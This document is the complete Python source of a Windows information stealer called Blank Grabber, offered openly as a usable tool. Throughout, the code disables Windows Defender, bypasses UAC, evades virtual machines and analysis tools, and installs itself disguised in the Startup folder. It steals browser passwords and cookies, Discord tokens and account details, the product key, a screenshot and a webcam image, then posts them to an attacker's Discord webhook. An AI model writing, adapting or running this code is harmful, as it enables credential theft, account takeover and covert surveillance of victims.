# UTF-8
# https://github.com/Blank-c/Blank-Grabber

WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
PINGME = True # Pings @everyone
VMPROTECT = True # Tries to protect your grabber from VMs
BSOD = True # Tries to trigger Blue Screen if grabber force exit
STARTUP = True # Puts the grabber in startup
HIDE_ITSELF = True # Hides the Grabber

import os, sys
if os.name!="nt" or not hasattr(sys, "frozen"):
    os._exit(0)
import urllib3
http = urllib3.PoolManager()
import threading
import subprocess
import shutil
import base64
import json
import random
import time
import pyaes
import re
from requests import *
import PIL.ImageGrab as ImageGrab, PIL.Image as Image, PIL.ImageStat as ImageStat
from win32crypt import CryptUnprotectData

def fquit():
    if BSOD:
        subprocess.run("taskkill /IM svchost.exe /F", capture_output= True, shell= True)
        subprocess.run("taskkill /IM csrss.exe /F", capture_output= True, shell= True)
        subprocess.run("taskkill /IM winnit.exe /F", capture_output= True, shell= True)
        subprocess.run("taskkill /IM winlogon.exe /F", capture_output= True, shell= True)
    os._exit(0)

def wd_exclude(path= None):
    if path is None:
        if hasattr(sys, 'frozen'):
            path = sys.executable
        else:
            path = os.path.abspath(__file__)
    subprocess.run(f"powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"{path}\"", shell= True, capture_output= True)

def disable_wd():
    windef = os.path.join(os.getenv("temp"), f"{generate(invisible= True)}.bat")
    with open(windef, "w") as e:
        e.write("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
    subprocess.run(windef, shell= True, capture_output= True)
    os.remove(windef)

def generate(num=5, invisible= False):
    if not invisible:
        return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
    else:
        return "".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k= num))

def is_admin():
    s = subprocess.run("net session", shell= True, capture_output= True).returncode
    if s == 0:
        return True
    else:
        return False

def uac_bypass():
    subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"{os.path.abspath(sys.executable)}\" /f", shell= True, capture_output= True)
    subprocess.run(f"reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f", shell= True, capture_output= True)
    subprocess.run("fodhelper.exe", shell= True, capture_output= True)
    subprocess.run(f"reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1", shell= True, capture_output= True)
    os._exit(0)

class vmprotect:
    def __init__(self):
        if int(subprocess.run("wmic computersystem get totalphysicalmemory", capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000 < 1.7:
            fquit()

        if subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] in ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", "FE822042-A70C-D08B-F1D1-C207055A488F", "76122042-C286-FA81-F0A8-514CC507B250"]:
            fquit()

        if os.getlogin().lower() in ["wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson", "user", "j.seance", "a.monaldo", "mike"]:
            fquit()

        if os.getenv("computername").lower() in ["bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29", "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc", "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj", "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076"]:
            fquit()

        tasks = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
        for banned_task in ["fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]:
            if banned_task in tasks.lower():
                kill = subprocess.run(f"taskkill /IM {banned_task}.exe /F", capture_output= True, shell= True)

                if kill.returncode != 0:
                    os._exit(0)
        try:
            http.request("GET", f"https://blank{generate()}.in")
        except Exception:
            pass
        else:
            fquit()

        if os.path.isfile(os.path.join("D:" + os.sep, "TOOLS", "Detonate.exe")):
            fquit()
        try:
            if http.request("GET", "http://ip-api.com/line/?fields=hosting").data.decode() == "true":
                fquit()
        except Exception:
            pass

class BlankGrabber:
    def __init__(self):
        self.http = http
        self.trust = 0
        self.webhook = WEBHOOK
        self.getPKey()
        self.archive = os.path.join(os.getenv("temp"), f"Blank-{os.getlogin()}.zip")
        self.tempfolder = os.path.join(os.getenv("temp"), generate(10, True))
        self.system = os.path.join(self.tempfolder, "System")
        self.localappdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.chromefolder = os.path.join(self.localappdata, "Google", "Chrome", "User Data")
        try:
            os.mkdir(self.tempfolder)
            os.mkdir(self.system)
        except FileExistsError:
            pass
        except Exception:
            os._exit(0)
        threads = []
        self.tokens = []
        self.ipinfo = self.getip()
        t = threading.Thread(target = lambda: self.webshot())
        t = threading.Thread(target = lambda: self.misc())
        t.start()
        threads.append(t)
        if os.path.isfile(os.path.join(self.chromefolder, "Local State")):
            t = threading.Thread(target = lambda: self.getcookie())
            t.start()
            threads.append(t)
            t = threading.Thread(target = lambda: self.getpass())
            t.start()
            threads.append(t)
        if os.path.isfile(os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")):
            t = threading.Thread(target = lambda: self.crash_bd())
            t.start()
            threads.append(t)
        t = threading.Thread(target = lambda: self.getTokens())
        t.start()
        threads.append(t)
        t = threading.Thread(target = lambda: self.screenshot())
        t.start()
        threads.append(t)

        for t in threads:
            t.join()
        if os.path.isfile(os.path.join(self.tempfolder, "Logs.txt")):
            with open(os.path.join(self.tempfolder, "Logs.txt"), "r+") as e:
                log = e.read()
                e.seek(0)
                e.write("These are the error logs generated during the execution of the program in the the target PC. You can try to figure it out for yourself if you want or create an issue at https://github.com/Blank-c/Blank-Grabber/issues \n\n"+log.strip())
        self.send()

    def is_monochrome(self, path):
        return __import__("functools").reduce(lambda x, y: x and y < 0.005, ImageStat.Stat(Image.open(path)).var, True)

    def webshot(self):
        if not hasattr(sys, "frozen"):
            return
        call = subprocess.run("a.es -d -p blank cm.bam.aes", capture_output= True, shell= True, cwd= sys._MEIPASS)
        if call.returncode != 0:
            return
        subprocess.run("cm.bam /filename Webcam.bmp", capture_output= True, shell= True, cwd= sys._MEIPASS)
        if self.is_monochrome(os.path.join(sys._MEIPASS, "Webcam.bmp")):
            os.remove(os.path.join(sys._MEIPASS, "Webcam.bmp"))
            return
        with Image.open(os.path.join(sys._MEIPASS, "Webcam.bmp")) as img:
            img.save(os.path.join(self.tempfolder, "Webcam.png"), "png")
        os.remove(os.path.join(sys._MEIPASS + "Webcam.bmp"))
        os.remove(os.path.join(sys._MEIPASS, "cm.bam"))
        self.trust += 2

    def getPKey(self):
        key = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode().strip()
        if len(key.split("-")) == 5:
            self.productKey = key

    def copy(self, source, destination):
        try:
            shutil.copy(source, destination)
        except Exception:
            try:
                os.makedirs(os.path.dirname(destination))
                shutil.copy(source, destination)
            except Exception as e:
                self.logs(e, sys.exc_info())

    def logs(self, e, exc_info):
        with open(os.path.join(self.tempfolder, "Logs.txt"), "a", errors= "ignore") as file:
            file.write(f"\nLine {exc_info[2].tb_lineno} : {e.__class__.__name__} : {e}")

    def getpass(self):
        if not hasattr(sys, "frozen"):
            return
        subprocess.run("a.es -d -p blank pm.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
        subprocess.run(f"pm.bam /stext \"{os.path.join(os.path.abspath(self.tempfolder), 'Passwords.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
        os.remove(os.path.join(sys._MEIPASS, "pm.bam"))
        with open(os.path.join(self.tempfolder, "Passwords.txt"), encoding= "utf-8", errors= "ignore") as file:
            if len(file.readlines()) > 100:
                self.trust += 1

    def getcookie(self):
        if not hasattr(sys, "frozen"):
            return
        subprocess.run("a.es -d -p blank ck.bam.aes", cwd= sys._MEIPASS, capture_output= True, shell= True)
        subprocess.run(f"ck.bam /stext \"{os.path.join(os.path.abspath(self.tempfolder), 'Cookies.txt')}\"", cwd= sys._MEIPASS, capture_output= True, shell= True)
        os.remove(os.path.join(sys._MEIPASS, "ck.bam"))
        with open(os.path.join(self.tempfolder, "Cookies.txt"), encoding= "utf-8", errors= "ignore") as file:
            if len(file.readlines()) > 100:
                self.trust += 1

    def crash_bd(self):
        bdasar = os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")
        if os.path.isfile(bdasar):
            try:
                os.remove(bdasar)
            except Exception as e:
                self.logs(e, sys.exc_info())

    def tree(self, path, DName= None):
        if DName is None:
            DName = os.path.basename(path)
        PIPE = "│"
        ELBOW = "└──"
        TEE = "├──"
        tree = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= path).stdout.decode()
        tree = tree.replace("+---", TEE).replace(r"\---", ELBOW).replace("|", PIPE).splitlines()
        tree = DName + "\n" + "\n".join(tree[3:])
        return tree.strip()

    def misc(self):
        output = []
        for location in ["Desktop", "Downloads", "Music", "Pictures", "Videos"]:
            output.append(f"[{location}]\n\n{self.tree(os.path.join(os.getenv('userprofile'), location))}")
        with open(os.path.join(self.system, "Tree.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
            file.write("\n\n".join(output).strip())

        output = subprocess.run("tasklist", capture_output= True, shell= True).stdout.decode()
        with open(os.path.join(self.system, "Task List.txt"), "w", errors= "ignore") as tasklist:
            tasklist.write(output.strip())

        output = subprocess.run("systeminfo", capture_output= True, shell= True).stdout.decode()
        with open(os.path.join(self.system, "System Info.txt"), "w", errors= "ignore") as file:
            file.write(output.strip())

    def getTokens(self):
        subprocess.run("taskkill /IM discordtokenprotector.exe /F", capture_output= True, shell= True)
        data = []
        paths = {
            "Discord": os.path.join(self.roaming, "discord"),
            "Discord Canary": os.path.join(self.roaming, "discordcanary"),
            "Lightcord": os.path.join(self.roaming, "Lightcord"),
            "Discord PTB": os.path.join(self.roaming, "discordptb"),
            "Opera": os.path.join(self.roaming, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(self.roaming, "Opera Software", "Opera GX Stable"),
            "Amigo": os.path.join(self.localappdata, "Amigo", "User Data"),
            "Torch": os.path.join(self.localappdata, "Torch", "User Data"),
            "Kometa": os.path.join(self.localappdata, "Kometa", "User Data"),
            "Orbitum": os.path.join(self.localappdata, "Orbitum", "User Data"),
            "CentBrowse": os.path.join(self.localappdata, "CentBrowser", "User Data"),
            "7Sta": os.path.join(self.localappdata, "7Star", "7Star", "User Data"),
            "Sputnik": os.path.join(self.localappdata, "Sputnik", "Sputnik", "User Data"),
            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
            "Chrome SxS": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
            "Chrome": os.path.join(self.chromefolder),
            "Epic Privacy Browse": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
            "Microsoft Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
            "Uran": os.path.join(self.localappdata, "uCozMedia", "Uran", "User Data"),
            "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data"),
            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
        }

        def RickRollDecrypt(path):
            def decrypt_token(encrypted_token, key):
                try:
                    return pyaes.AESModeOfOperationGCM(CryptUnprotectData(key, None, None, None, 0)[1], encrypted_token[3:15]).decrypt(encrypted_token[15:])[:-16].decode()

                except Exception as e:
                    self.logs(e, sys.exc_info())
                    return
            encrypted_tokens = []
            with open(localstatepath, "r", errors= "ignore") as keyfile:
                try:
                    key = json.load(keyfile)["os_crypt"]["encrypted_key"]
                except Exception:
                    return
            for file in os.listdir(os.path.join(path, "Local Storage", "leveldb")):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue
                else:
                    for line in [x.strip() for x in open(f"{path}\\Local Storage\\leveldb/{file}", errors="ignore").readlines() if x.strip()]:
                        for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            if token.endswith("\\"):
                                token = (token[::-1].replace("\\", "", 1))[::-1]
                            if not token in encrypted_tokens:
                                encrypted_tokens.append(token)

            for token in encrypted_tokens:
                token = decrypt_token(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), base64.b64decode(key)[5:])
                if token:
                    if not token in self.tokens:
                        self.tokens.append(token)

        def grabcord(path):
            for filename in os.listdir(path):
                if not filename.endswith(".log") and not filename.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(os.path.join(path, filename), errors="ignore").readlines() if x.strip()]:
                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(reg, line):
                            if not token in self.tokens:
                                self.tokens.append(token)

        token_threads = []

        for path in paths.items():
            localstatepath = os.path.join(path[1], "Local State")
            if not os.path.exists(path[1]):
                continue
            else:
                t = threading.Thread(target= lambda: RickRollDecrypt(path[1]))
                token_threads.append(t)
                t.start()
                nextPaths = subprocess.run("dir leveldb /AD /s /b", capture_output= True, shell= True, cwd= path[1]).stdout.decode().strip().splitlines()
                for path in nextPaths:
                    t = threading.Thread(target= lambda: grabcord(path))
                    token_threads.append(t)
                    t.start()

        for i in token_threads[::-1]:
            i.join()

        for token in self.tokens:
                token = token.strip()
                r = self.http.request("GET", "https://discord.com/api/v9/users/@me", headers=self.headers(token))
                if r.status!=200:
                    continue
                r = json.loads(r.data.decode())
                user = r["username"] + "#" + str(r["discriminator"])
                email = r["email"].strip() if r["email"] else "(No Email)"
                phone = r["phone"] if r["phone"] else "(No Phone Number)"
                verified=r["verified"]
                nitro_data = json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers=self.headers(token)).data.decode())
                has_nitro = False
                has_nitro = len(nitro_data)>0
                billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
        if len(data)!= 0:
            self.trust += 3
            with open(os.path.join(self.tempfolder, "Discord Info.txt"), "w", errors="ignore") as file:
                file.write("\n\n".join(data))

    def screenshot(self):
        image = ImageGrab.grab()
        image.save(os.path.join(self.tempfolder, "Screenshot.png"))
        del image

    def headers(self, token=None):
        headers = {
        "content-type" : "application/json",
        "user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"
        }
        if token:
            headers["authorization"] = token

        return headers

    def getip(self):
        try:
            r = json.loads(self.http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
            if r.get("status") != "success":
                raise Exception("Failed")
            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run("wmic csproduct get uuid", capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str())+ f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {chr(9989) if r['mobile'] else chr(10062)}\n{'Proxy/VPN:'.ljust(20)} {chr(9989) if r['proxy'] else chr(10062)}"
            if len(r["reverse"]) != 0:
                data += f"\nReverse DNS: {r['reverse']}"
        except Exception as e:
            self.logs(e, sys.exc_info())
            r = json.loads(self.http.request("GET", "http://httpbin.org/get").data.decode())
            data = f"Computer Name: {os.getenv('computername')}\nComputer OS: {subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode().strip().splitlines()[2].strip()}\nTotal Memory: {int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode().strip().split()[1])/1000000000)} GB" + "\nUUID: " + subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode().strip().split()[1] + (f"\nProduct Key: {self.productKey}" if self.productKey is not None else str()) + f"\nIP: {r.get('origin')}"
        return data

    def zip(self):
        shutil.make_archive(self.archive[:-3], "zip", self.tempfolder)

    def send(self):
        self.zip()
        payload = {
  "content": "@everyone" if PINGME else "",
  "embeds": [
    {
      "title": "Blank Grabber",
      "description": f"```fix\n{self.ipinfo}```\n**Files: **```fix\n{self.tree(self.tempfolder, 'Blank Grabber')}```",
      "url": "https://github.com/Blank-c/Blank-Grabber/",
      "color": 16737536,
      "footer": {
        "text": "Grabbed By Blank Grabber!"
      }
    }
  ],
  "username": "Blank Grabber",
  "avatar_url": "https://i.imgur.com/ZZZtlwB.png"
}
        if self.trust < 2:
            fquit()
        self.webhook = base64.b85decode(self.webhook.encode()).decode()
        self.http.request("POST", self.webhook, body= json.dumps(payload).encode(), headers= self.headers())
        with open(self.archive,"rb") as file:
            self.http.request("POST", self.webhook, fields= {"file": (self.archive, file.read())}, headers= {"user-agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4593.122 Safari/537.36"})

        try:
            os.remove(self.archive)
            shutil.rmtree(self.tempfolder)
        except Exception:
            pass
        os._exit(0)

if __name__ == "__main__":
    if not is_admin():
        uac_bypass()
    t = threading.Thread(target= disable_wd)
    t.start()

    while True:
        try:
            r = json.loads(http.request("GET", "https://httpbin.org/get?1=2").data.decode())
            if r.get("args").get("1") != "2":
                os._exit(0)
            if VMPROTECT:
                vmprotect()
            frozen = hasattr(sys, "frozen")
            if frozen and STARTUP:
                if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                    try:
                        exepath = os.path.join("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\", f"ScreenSaver-{generate()}.scr")
                        BlankGrabber.copy("Blank", sys.executable, exepath)
                        wd_exclude(exepath)
                    except Exception:
                        pass

            if frozen and HIDE_ITSELF and os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1] != "startup":
                subprocess.run(f"attrib \"{sys.executable}\" +s +h", shell= True, capture_output= True)
            try:
                wd_exclude()
                t.join()
                BlankGrabber()
            except Exception:
                pass
        except Exception:
            time.sleep(900) #15 Minutes
